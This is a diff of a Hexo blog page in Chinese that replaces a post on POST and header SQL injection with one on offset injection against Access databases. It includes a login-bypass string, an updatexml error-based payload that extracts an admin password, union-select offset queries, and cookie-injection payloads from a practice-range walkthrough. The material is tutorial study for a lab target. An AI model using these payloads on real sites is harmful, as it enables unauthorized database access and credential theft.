@@ -96,17 +96,17 @@
 
 
 
-  <meta name="description" content="####1.POST注入介绍post注入高危点登录框查询框等各种与数据库有交互的地方万能密码‘or 1=1#单引号闭合前面的内容，1=1使得条件成立可以提交，#将之后内容注释 ####2.Head注入介绍php全局变量-超全局变量一个脚本的全部作用域使用$_REQUEST$_POST$_GET$_COOKIE$_SERVER功能强大 #Head注入原理通过服务器存储的请求头抓包查询引入函数upda">
+  <meta name="description" content="1.偏移注入使用场景并不仅仅用于accssess,sql也可以使用在sql注入的时候会遇到一些无法查询列名的问题，比如系统数据库带的权限不够而无法访问系统自带库accsess不存在系统自带库，则无法知道字段名联合查询必须字段相同当猜到表名无法猜到字段的情况下，我们可以使用偏移注入来查询那张表里面的数据像sqlmap之类的工具其实是爆破字段的名字，但是如果字段名字比较奇葩，例如：H5scker_Pa">
 <meta property="og:type" content="article">
-<meta property="og:title" content="POST,Head注入">
-<meta property="og:url" content="http://yoursite.com/2019/05/31/postHead注入/index.html">
+<meta property="og:title" content="Accsess注入-偏移注入">
+<meta property="og:url" content="http://yoursite.com/2019/06/03/Accsess注入-偏移注入/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="####1.POST注入介绍post注入高危点登录框查询框等各种与数据库有交互的地方万能密码‘or 1=1#单引号闭合前面的内容，1=1使得条件成立可以提交，#将之后内容注释 ####2.Head注入介绍php全局变量-超全局变量一个脚本的全部作用域使用$_REQUEST$_POST$_GET$_COOKIE$_SERVER功能强大 #Head注入原理通过服务器存储的请求头抓包查询引入函数upda">
+<meta property="og:description" content="1.偏移注入使用场景并不仅仅用于accssess,sql也可以使用在sql注入的时候会遇到一些无法查询列名的问题，比如系统数据库带的权限不够而无法访问系统自带库accsess不存在系统自带库，则无法知道字段名联合查询必须字段相同当猜到表名无法猜到字段的情况下，我们可以使用偏移注入来查询那张表里面的数据像sqlmap之类的工具其实是爆破字段的名字，但是如果字段名字比较奇葩，例如：H5scker_Pa">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2019-05-31T11:10:37.800Z">
+<meta property="og:updated_time" content="2019-06-03T11:30:40.438Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="POST,Head注入">
-<meta name="twitter:description" content="####1.POST注入介绍post注入高危点登录框查询框等各种与数据库有交互的地方万能密码‘or 1=1#单引号闭合前面的内容，1=1使得条件成立可以提交，#将之后内容注释 ####2.Head注入介绍php全局变量-超全局变量一个脚本的全部作用域使用$_REQUEST$_POST$_GET$_COOKIE$_SERVER功能强大 #Head注入原理通过服务器存储的请求头抓包查询引入函数upda">
+<meta name="twitter:title" content="Accsess注入-偏移注入">
+<meta name="twitter:description" content="1.偏移注入使用场景并不仅仅用于accssess,sql也可以使用在sql注入的时候会遇到一些无法查询列名的问题，比如系统数据库带的权限不够而无法访问系统自带库accsess不存在系统自带库，则无法知道字段名联合查询必须字段相同当猜到表名无法猜到字段的情况下，我们可以使用偏移注入来查询那张表里面的数据像sqlmap之类的工具其实是爆破字段的名字，但是如果字段名字比较奇葩，例如：H5scker_Pa">
 
 
 
@@ -114,7 +114,7 @@
 
   
   
-  <link rel="canonical" href="http://yoursite.com/2019/05/31/postHead注入/">
+  <link rel="canonical" href="http://yoursite.com/2019/06/03/Accsess注入-偏移注入/">
 
 
 
@@ -124,7 +124,7 @@
   };
 </script>
 
-  <title>POST,Head注入 | Hexo</title>
+  <title>Accsess注入-偏移注入 | Hexo</title>
   
 
 
@@ -289,7 +289,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/05/31/postHead注入/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/06/03/Accsess注入-偏移注入/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="John Doe">
@@ -306,7 +306,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">POST,Head注入
+          <h1 class="post-title" itemprop="name headline">Accsess注入-偏移注入
 
               
             
@@ -332,7 +332,7 @@
                 
               
 
-              <time title="Created: 2019-05-31 19:10:37" itemprop="dateCreated datePublished" datetime="2019-05-31T19:10:37+08:00">2019-05-31</time>
+              <time title="Created: 2019-06-03 19:30:40" itemprop="dateCreated datePublished" datetime="2019-06-03T19:30:40+08:00">2019-06-03</time>
             
 
             
@@ -367,9 +367,12 @@
       
 
       
-        <p>####1.POST注入介绍<br>post注入高危点<br>登录框<br>查询框<br>等各种与数据库有交互的地方<br>万能密码<br>‘or 1=1#<br>单引号闭合前面的内容，1=1使得条件成立可以提交，#将之后内容注释</p>
-<p>####2.Head注入介绍<br>php全局变量-超全局变量<br>一个脚本的全部作用域使用<br>$_REQUEST<br>$_POST<br>$_GET<br>$_COOKIE<br>$_SERVER功能强大</p>
-<p>#Head注入原理<br>通过服务器存储的请求头抓包查询<br>引入函数<br>updatexml()更新xml文档的函数<br>updatexml(1,concat(0x7e,(select database()),0x7e),1)<br>在更新XML文档，但是写入了子查询，因为符号输入不符合规则所以报错，但已经执行了子查询代码<br>select updatexml(1,concat(0x7e,(select password from admin limit 0,1)),1);<br>报出数据库密码</p>
+        <h4 id="1-偏移注入使用场景"><a href="#1-偏移注入使用场景" class="headerlink" title="1.偏移注入使用场景"></a>1.偏移注入使用场景</h4><p>并不仅仅用于accssess,sql也可以使用<br>在sql注入的时候会遇到一些无法查询列名的问题，比如系统数据库带的权限不够而无法访问系统自带库<br>accsess不存在系统自带库，则无法知道字段名<br>联合查询必须字段相同<br>当猜到表名无法猜到字段的情况下，我们可以使用偏移注入来查询那张表里面的数据<br>像sqlmap之类的工具其实是爆破字段的名字，但是如果字段名字比较奇葩，例如：H5scker_Passwd之类的就无可奈何了<br>工具爆破即为穷举<br>引入知识<br>table_name.*
+实际上是指表名.*
+<em>就是通配符<br>数据库中表名.</em><br>则为那个表中所有字段<br>在mysql中<br>select * from admin = select id,a,b from admin<br>=select admin.* from admin<br>将下列句子尝试改为<br>select * from admin where id=1 and 1=2 union select 1,2,3,4,<del>5</del>admin.* from admin<br>回显报错<br>因为前面的数字也为字段<br>我们将前面的数字删除<br>select 1,2 admin.* from<br>将所有数据成功输出（尽管不知道字段名）<br>偏移注入条件为：第一张表的字段比第二张表多（越多越好）</p>
+<h4 id="2-偏移注入步骤"><a href="#2-偏移注入步骤" class="headerlink" title="2.偏移注入步骤"></a>2.偏移注入步骤</h4><p>（1）判断注入点<br>（2）order by 判断字段数<br>（3）判断表名 可通过sqlmap爆破<br>（4）联合查询<br>（5）获取表中列数，知道存在几列以及输出点<br>（6）开始偏移注入</p>
+<h4 id="3-靶场讲解"><a href="#3-靶场讲解" class="headerlink" title="3.靶场讲解"></a>3.靶场讲解</h4><p>先通过cookie注入<br>document.cookie=”id=”+escape(“105 order by 26”);<br>写27报错说明有26个字段<br>document.cookie=”id=”+escape(“105+union+select+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26+from+admin”);<br>accsess要加from admin（一般存在admin表名可以直接用）<br>页面报错3 5 7<br>我们将26改成admin.*
+页面报错则将字段删除末尾一个往前移<br>退到16时，将16改为admin.*,后接上所有字段<br>页面则回显密码<br>我们查看源码可发现图片的图片值里有一个隐藏输入点</p>
 
       
     </div>
@@ -400,8 +403,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/05/31/sql注入原理分析/" rel="next" title="sql注入原理分析">
-                <i class="fa fa-chevron-left"></i> sql注入原理分析
+              <a href="/2019/06/03/宽字节注入/" rel="next" title="宽字节注入">
+                <i class="fa fa-chevron-left"></i> 宽字节注入
               </a>
             
           </div>
@@ -409,10 +412,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/05/31/盲注/" rel="prev" title="盲注">
-                盲注 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -456,8 +455,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
 
-      <div class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <div class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -503,6 +511,23 @@
         </div>
       </div>
 
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-偏移注入使用场景"><span class="nav-number">1.</span> <span class="nav-text">1.偏移注入使用场景</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-偏移注入步骤"><span class="nav-number">2.</span> <span class="nav-text">2.偏移注入步骤</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-靶场讲解"><span class="nav-number">3.</span> <span class="nav-text">3.靶场讲解</span></a></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
       
 
       
